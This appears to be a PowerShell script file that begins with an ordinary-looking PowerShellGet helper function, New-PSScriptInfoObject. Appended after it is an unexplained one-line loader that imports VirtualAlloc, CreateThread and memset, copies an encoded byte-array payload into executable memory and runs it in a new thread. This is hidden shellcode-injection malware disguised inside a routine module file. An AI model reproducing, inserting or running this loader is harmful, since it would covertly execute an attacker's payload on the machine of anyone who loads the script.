function New-PSScriptInfoObject
{
    [CmdletBinding(PositionalBinding=$false)]
    Param
    (
        [Parameter(Mandatory=$true)]
        [string]
        $Path
    )

    $PSScriptInfo = Microsoft.PowerShell.Utility\New-Object PSCustomObject -Property ([ordered]@{})
    $script:PSScriptInfoProperties | Microsoft.PowerShell.Core\ForEach-Object {
                                            Microsoft.PowerShell.Utility\Add-Member -InputObject $PSScriptInfo `
                                                                                    -MemberType NoteProperty `
                                                                                    -Name $_ `
                                                                                    -Value $null
                                        }

    $PSScriptInfo.$script:Name = [System.IO.Path]::GetFileNameWithoutExtension($Path)
    $PSScriptInfo.$script:Path = $Path
    $PSScriptInfo.$script:ScriptBase = (Microsoft.PowerShell.Management\Split-Path -Path $Path -Parent)

    return $PSScriptInfo
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbe,0x80,0x11,0x38,0xa6,0xdd,0xc3,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x47,0x31,0x70,0x13,0x83,0xe8,0xfc,0x03,0x70,0x8f,0xf3,0xcd,0x5a,0x67,0x71,0x2d,0xa3,0x77,0x16,0xa7,0x46,0x46,0x16,0xd3,0x03,0xf8,0xa6,0x97,0x46,0xf4,0x4d,0xf5,0x72,0x8f,0x20,0xd2,0x75,0x38,0x8e,0x04,0xbb,0xb9,0xa3,0x75,0xda,0x39,0xbe,0xa9,0x3c,0x00,0x71,0xbc,0x3d,0x45,0x6c,0x4d,0x6f,0x1e,0xfa,0xe0,0x80,0x2b,0xb6,0x38,0x2a,0x67,0x56,0x39,0xcf,0x3f,0x59,0x68,0x5e,0x34,0x00,0xaa,0x60,0x99,0x38,0xe3,0x7a,0xfe,0x05,0xbd,0xf1,0x34,0xf1,0x3c,0xd0,0x05,0xfa,0x93,0x1d,0xaa,0x09,0xed,0x5a,0x0c,0xf2,0x98,0x92,0x6f,0x8f,0x9a,0x60,0x12,0x4b,0x2e,0x73,0xb4,0x18,0x88,0x5f,0x45,0xcc,0x4f,0x2b,0x49,0xb9,0x04,0x73,0x4d,0x3c,0xc8,0x0f,0x69,0xb5,0xef,0xdf,0xf8,0x8d,0xcb,0xfb,0xa1,0x56,0x75,0x5d,0x0f,0x38,0x8a,0xbd,0xf0,0xe5,0x2e,0xb5,0x1c,0xf1,0x42,0x94,0x48,0x36,0x6f,0x27,0x88,0x50,0xf8,0x54,0xba,0xff,0x52,0xf3,0xf6,0x88,0x7c,0x04,0xf9,0xa2,0x39,0x9a,0x04,0x4d,0x3a,0xb2,0xc2,0x19,0x6a,0xac,0xe3,0x21,0xe1,0x2c,0x0c,0xf4,0xa6,0x7c,0xa2,0xa7,0x06,0x2d,0x02,0x18,0xef,0x27,0x8d,0x47,0x0f,0x48,0x44,0xe0,0xba,0xb2,0x0e,0xcf,0x93,0x95,0x96,0xa7,0xe1,0xe5,0x39,0xa2,0x6f,0x03,0x2f,0xc2,0x39,0x9b,0xc7,0x7b,0x60,0x57,0x76,0x83,0xbe,0x1d,0xb8,0x0f,0x4d,0xe1,0x76,0xf8,0x38,0xf1,0xee,0x08,0x77,0xab,0xb8,0x17,0xad,0xc6,0x44,0x82,0x4a,0x41,0x13,0x3a,0x51,0xb4,0x53,0xe5,0xaa,0x93,0xe8,0x2c,0x3f,0x5c,0x86,0x50,0xaf,0x5c,0x56,0x07,0xa5,0x5c,0x3e,0xff,0x9d,0x0e,0x5b,0x00,0x08,0x23,0xf0,0x95,0xb3,0x12,0xa5,0x3e,0xdc,0x98,0x90,0x09,0x43,0x62,0xf7,0x8b,0xbf,0xb5,0x31,0xfe,0xd1,0x05;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

